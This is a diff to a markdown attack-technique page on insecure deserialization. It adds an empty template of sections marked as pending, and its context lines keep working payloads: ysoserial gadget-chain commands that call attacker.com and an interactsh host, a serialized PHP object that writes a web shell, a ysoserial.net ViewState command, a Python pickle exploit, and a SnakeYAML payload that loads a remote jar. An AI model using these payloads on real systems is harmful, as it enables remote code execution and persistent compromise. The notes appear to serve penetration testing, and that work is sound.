@@ -1,5 +1,63 @@
 # Deserialization Techniques
 
+> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.
+
+_Last updated: — · Items: 0_
+
+---
+
+## What
+
+_Define the class, prerequisites, and typical finding shape. Fill with real content._
+_pending enrichment — baseline opener below_
+
+See items under ## Items for per-finding details.
+
+---
+
+## CVEs
+
+_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._
+
+---
+
+## Probes
+
+_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
+_pending enrichment_
+
+---
+
+## PoCs
+
+_Public PoC links rolled up from items below._
+
+_No PoCs in items yet._
+
+---
+
+## Reproduction
+
+_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
+_pending enrichment_
+
+---
+
+## Defense
+
+_Patch guidance and detection rules. Populated from vendor advisories._
+_pending enrichment_
+
+---
+
+## References
+
+_Populated by daily refresh-latest pipeline._
+
+---
+
+## Items
+
 > Insecure deserialization — when untrusted data is used to reconstruct objects, allowing attackers to trigger arbitrary code execution via gadget chains.
 
 ## Format fingerprinting
@@ -37,22 +95,27 @@ Check cookies, hidden fields, API bodies, cache entries, session blobs, message 
    - `---\n` or `!!python/object:` = YAML
 
 2. **Java deserialization** — generate gadget chain with ysoserial:
+
    ```
    java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/rce' | base64 -w 0
    ```
+
    Inject into cookie/header, trigger deserialization endpoint.
 
 3. **PHP object injection** — find a `__wakeup()` or `__destruct()` with dangerous logic; craft magic method chain:
+
    ```php
    O:8:"UserPref":2:{s:4:"path";s:21:"/var/www/html/cmd.php";s:7:"content";s:17:"<?php system($_GET['c']); ?>";}
    ```
 
 4. **.NET ViewState** — check if MAC validation disabled: decode base64, edit, re-encode; or use ysoserial.net:
+
    ```
    ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc.exe" --validationalg="SHA1" --validationkey="<key>"
    ```
 
 5. **Python pickle** — craft malicious pickle payload:
+
    ```python
    import pickle, os
    class Exploit(object):
@@ -62,11 +125,13 @@ Check cookies, hidden fields, API bodies, cache entries, session blobs, message 
    ```
 
 6. **YAML** — SnakeYAML RCE:
+
    ```yaml
    !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/payload.jar"]]]]
    ```
 
 7. **Blind OOB detection** — use Interactsh for DNS callback in gadget chain:
+
    ```
    java -jar ysoserial.jar URLDNS "http://attacker.interactsh.com" | base64 -w 0
    ```
